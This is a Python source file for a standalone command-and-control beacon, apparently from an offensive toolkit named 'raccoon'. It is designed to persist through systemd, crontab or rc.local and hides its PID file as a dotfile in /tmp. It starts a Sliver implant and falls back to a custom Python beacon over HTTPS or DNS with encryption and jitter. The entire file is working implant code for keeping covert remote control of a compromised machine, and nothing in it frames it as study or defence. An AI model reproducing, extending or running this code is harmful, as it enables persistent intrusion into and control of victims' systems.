#!/usr/bin/env python3
"""
Standalone C2 beacon — runs independently of the main orchestrator.
Designed for persistence: started by systemd, crontab, or rc.local.

Strategy:
  1. Try to launch the Sliver implant binary (primary)
  2. If binary missing/fails, fall back to custom Python beacon
  3. Periodically retry Sliver if it was unavailable at startup
"""

import logging
import os
import signal
import sys
import time
from logging.handlers import RotatingFileHandler
from pathlib import Path

import yaml

CONFIG_PATHS = [
    "/opt/raccoon/configs/raccoon.yaml",
    os.path.join(os.path.dirname(__file__), "..", "..", "configs", "raccoon.yaml"),
]

LOG_DIR = Path("/opt/raccoon/logs")
PID_FILE = Path("/tmp/.raccoon_beacon.pid")


def already_running() -> bool:
    """Prevent duplicate beacon instances."""
    if PID_FILE.exists():
        try:
            pid = int(PID_FILE.read_text().strip())
            os.kill(pid, 0)
            return True
        except (ProcessLookupError, ValueError):
            PID_FILE.unlink(missing_ok=True)
    return False


def write_pid():
    PID_FILE.write_text(str(os.getpid()))


def remove_pid():
    PID_FILE.unlink(missing_ok=True)


def load_config() -> dict:
    for p in CONFIG_PATHS:
        path = Path(p)
        if path.exists():
            with open(path) as f:
                return yaml.safe_load(f)
    return {}


def setup_logging():
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    fmt = logging.Formatter("%(asctime)s [beacon] %(levelname)s %(message)s")

    fh = RotatingFileHandler(
        LOG_DIR / "beacon.log",
        maxBytes=2 * 1024 * 1024,
        backupCount=3,
    )
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(fmt)

    root = logging.getLogger()
    root.setLevel(logging.DEBUG)
    root.addHandler(fh)


def main():
    if already_running():
        sys.exit(0)

    setup_logging()
    logger = logging.getLogger("raccoon.beacon.standalone")
    write_pid()

    config = load_config()
    if not config or not config.get("c2", {}).get("enabled"):
        logger.warning("C2 disabled or no config found — exiting")
        remove_pid()
        sys.exit(0)

    running = True

    def shutdown(sig, frame):
        nonlocal running
        running = False

    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)

    c2_cfg = config["c2"]
    sliver_cfg = c2_cfg.get("sliver", {})
    fallback_cfg = c2_cfg.get("fallback", {})
    sliver_mgr = None
    python_beacon = None

    # ── Try Sliver first ──
    if sliver_cfg.get("enabled", False):
        from software.c2.sliver import SliverManager
        sliver_mgr = SliverManager(config)

        if sliver_mgr.is_implant_available or sliver_cfg.get("staging_url"):
            logger.info("Starting Sliver implant (primary C2)")
            sliver_mgr.start()
        else:
            logger.warning("Sliver binary not found at %s", sliver_cfg.get("implant_path"))
            sliver_mgr = None

    # ── Fall back to Python beacon if Sliver unavailable ──
    if sliver_mgr is None and fallback_cfg.get("enabled", False):
        logger.info("Starting Python beacon (fallback C2)")
        from software.c2.beacon import Beacon

        fallback_as_config = {
            "c2": {
                "beacon_interval_seconds": c2_cfg.get("beacon_interval_seconds", 300),
                "jitter_percent": c2_cfg.get("jitter_percent", 20),
                "encryption_key": c2_cfg.get("encryption_key", ""),
                "https": fallback_cfg.get("https", {}),
                "dns": fallback_cfg.get("dns", {}),
            }
        }
        python_beacon = Beacon(fallback_as_config)
        python_beacon.start()

    if sliver_mgr is None and python_beacon is None:
        logger.error("No C2 channel available — exiting")
        remove_pid()
        sys.exit(1)

    logger.info("Standalone beacon active (PID %d)", os.getpid())

    while running:
        time.sleep(1)

    # ── Shutdown ──
    if sliver_mgr:
        sliver_mgr.stop()
    if python_beacon:
        python_beacon.stop()

    remove_pid()
    logger.info("Standalone beacon stopped")


if __name__ == "__main__":
    main()
